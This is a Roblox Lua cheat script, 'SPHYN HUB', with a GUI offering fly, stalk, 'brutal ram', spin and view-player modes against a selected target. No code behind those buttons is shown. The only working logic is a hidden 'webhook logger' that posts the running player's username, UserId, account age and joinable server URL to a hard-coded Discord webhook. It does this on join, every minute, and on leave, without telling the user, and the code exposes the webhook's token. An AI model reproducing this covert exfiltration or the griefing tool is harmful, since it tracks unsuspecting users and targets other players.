--// SERVICES
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local LP = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// STATE
local Fly, Stalk, RamMode, Spectate, SpinMode, FlipMode = false,false,false,false,false,false
local TargetPlayer = nil

local Speed = 40
local Alt = 20
local SpinSpeed = 70
local FlipSpeed = 150

local Up, Down = false,false
local LastLook = Vector3.new(0,0,1)
local IsOpen = true


--// UI ROOT
local sg = Instance.new("ScreenGui")
sg.Name = "SPHYN HUB"
sg.ResetOnSpawn = false
sg.Parent = LP.PlayerGui


--// MAIN UI
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0,190,0,420)
main.Position = UDim2.new(0.05,0,0.2,0)
main.BackgroundColor3 = Color3.fromRGB(15,15,20)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true

Instance.new("UICorner",main).CornerRadius = UDim.new(0,12)

local stroke = Instance.new("UIStroke",main)
stroke.Color = Color3.fromRGB(0,170,255)
stroke.Thickness = 1.5


--// HEADER
local head = Instance.new("Frame",main)
head.Size = UDim2.new(1,0,0,35)
head.BackgroundColor3 = Color3.fromRGB(25,25,35)

Instance.new("UICorner",head).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel",head)
title.Size = UDim2.new(1,0,1,0)
title.Position = UDim2.new(0.08,0,0,0)
title.Text = "SPHYN HUB <font color='#00aaff'>RUSUH FISHIT</font>"
title.RichText = true
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 12
title.TextXAlignment = Enum.TextXAlignment.Left


local closeBtn = Instance.new("TextButton",head)
closeBtn.Size = UDim2.new(0,30,0,30)
closeBtn.Position = UDim2.new(0.82,0,0.05,0)
closeBtn.Text = "-"
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.BackgroundTransparency = 1
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20


--// CONTENT
local content = Instance.new("Frame",main)
content.Size = UDim2.new(1,0,1,-40)
content.Position = UDim2.new(0,0,0,40)
content.BackgroundTransparency = 1


--// BUTTON CREATOR
local function createBtn(text,pos,color)
    local btn = Instance.new("TextButton",content)

    btn.Size = UDim2.new(0.9,0,0,28)
    btn.Position = pos
    btn.Text = text
    btn.BackgroundColor3 = color or Color3.fromRGB(35,35,45)
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 10

    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,8)

    return btn
end


--// BUTTONS
local btnF = createBtn("✈️ FLY: OFF",UDim2.new(0.05,0,0,0))
local btnS = createBtn("👁️ STALK: OFF",UDim2.new(0.05,0,0.08,0))
local btnR = createBtn("🏎️ BRUTAL RAM: OFF",UDim2.new(0.05,0,0.16,0))
local btnSpin = createBtn("🌪️ SPIN MODE: OFF",UDim2.new(0.05,0,0.24,0),Color3.fromRGB(150,75,0))
local btnFlip = createBtn("🤸 BRUTAL FLIP: OFF",UDim2.new(0.05,0,0.32,0),Color3.fromRGB(200,80,0))
local btnSpec = createBtn("🎥 VIEW PLAYER: OFF",UDim2.new(0.05,0,0.40,0),Color3.fromRGB(70,30,100))
local btnSelect = createBtn("🎯 SELECT TARGET",UDim2.new(0.05,0,0.90,0),Color3.fromRGB(50,50,60))


--// INPUT CREATOR
local function createInput(label,pos,default)

    local box = Instance.new("TextBox",content)
    box.Size = UDim2.new(0.35,0,0,25)
    box.Position = pos
    box.Text = tostring(default)
    box.BackgroundColor3 = Color3.fromRGB(40,40,50)
    box.TextColor3 = Color3.new(1,1,1)
    box.Font = Enum.Font.GothamBold
    box.TextSize = 10

    Instance.new("UICorner",box)

    local lbl = Instance.new("TextLabel",content)
    lbl.Text = label
    lbl.Position = UDim2.new(0.05,0,pos.Y.Scale,0)
    lbl.Size = UDim2.new(0,70,0,25)
    lbl.TextColor3 = Color3.new(1,1,1)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    return box
end


local speedBox = createInput("FLY SPEED:",UDim2.new(0.55,0,0.65,0),40)
local spinBox = createInput("SPIN SPEED:",UDim2.new(0.55,0,0.73,0),70)
local flipBox = createInput("FLIP SPEED:",UDim2.new(0.55,0,0.81,0),150)


--// ==============================
--// WEBHOOK LOGGER
--// ==============================

local WEBHOOK =
"https://discordapp.com/api/webhooks/1445175775203688518/p6jM5eCctX3h5IF5ul7eIu_lC7dz6C63ShcxF_HHoz3e4aWLw8_w74ncDKVW0XRgwRxD"

local startTime = os.time()
local joinTimeFormatted = os.date("%H:%M:%S")
local messageId


local function formatTime(sec)

    return string.format(
        "%02d:%02d:%02d",
        sec // 3600,
        (sec % 3600) // 60,
        sec % 60
    )

end


local function getGameName()

    local ok,data = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)

    if ok then
        return data.Name
    end

    return "Unknown"

end


local function buildPayload(status,leaveTime)

    local profileUrl =
        "https://www.roblox.com/users/" ..
        LP.UserId ..
        "/profile"

    local jobId = game.JobId

    local serverUrl =
        "https://www.roblox.com/games/start?placeId=" ..
        game.PlaceId ..
        "&gameInstanceId=" ..
        jobId


    return {

        username = "Player Logger",

        embeds = {{

            title = "Roblox Player Activity - Sphyn Hub Rusuh",
            url = profileUrl,

            color =
                status == "JOIN" and 0x00FF00
                or status == "LEAVE" and 0xFF0000
                or 0x00AAFF,

            fields = {

                {
                    name = "Username",
                    value = "["..LP.Name.."]("..profileUrl..")",
                    inline = true
                },

                {
                    name = "UserId",
                    value = "```"..LP.UserId.."```",
                    inline = true
                },

                {
                    name = "Status",
                    value = "```"..status.."```",
                    inline = true
                },

                {
                    name = "Game",
                    value = "```"..getGameName().."```"
                },

                {
                    name = "Place ID",
                    value = "```"..game.PlaceId.."```",
                    inline = true
                },

                {
                    name = "JobId",
                    value = "```"..jobId.."```",
                    inline = true
                },

                {
                    name = "Server URL",
                    value = serverUrl
                },

                {
                    name = "Account Age",
                    value = "```"..LP.AccountAge.." days```",
                    inline = true
                },

                {
                    name = "Join Time",
                    value = "```"..joinTimeFormatted.."```",
                    inline = true
                },

                {
                    name = "Leave Time",
                    value = "```"..(leaveTime or "-").."```",
                    inline = true
                },

                {
                    name = "Uptime",
                    value = "```"..formatTime(os.time()-startTime).."```"
                }

            },

            footer = {
                text = "Sphyn Hub Logger"
            },

            timestamp = DateTime.now():ToIsoDate()

        }}

    }

end


local function sendWebhook(status,leaveTime)

    if not request then return end

    local ok,res = pcall(function()

        return request({

            Url = WEBHOOK.."?wait=true",
            Method = "POST",

            Headers = {
                ["Content-Type"] = "application/json"
            },

            Body = HttpService:JSONEncode(
                buildPayload(status,leaveTime)
            )

        })

    end)

    if ok and res and res.Body then

        local data = HttpService:JSONDecode(res.Body)
        messageId = data.id

    end

end


local function editWebhook()

    if not messageId or not request then
        return
    end

    pcall(function()

        request({

            Url = WEBHOOK.."/messages/"..messageId,
            Method = "PATCH",

            Headers = {
                ["Content-Type"] = "application/json"
            },

            Body = HttpService:JSONEncode(
                buildPayload("ONLINE")
            )

        })

    end)

end


--// LOGGER START

task.spawn(function()

    sendWebhook("JOIN")

    while task.wait(60) do
        if not messageId then break end
        editWebhook()
    end

end)


game:BindToClose(function()

    local leaveTime = os.date("%H:%M:%S")
    sendWebhook("LEAVE",leaveTime)

end)


print("SPHYN HUB Loaded Successfully.")
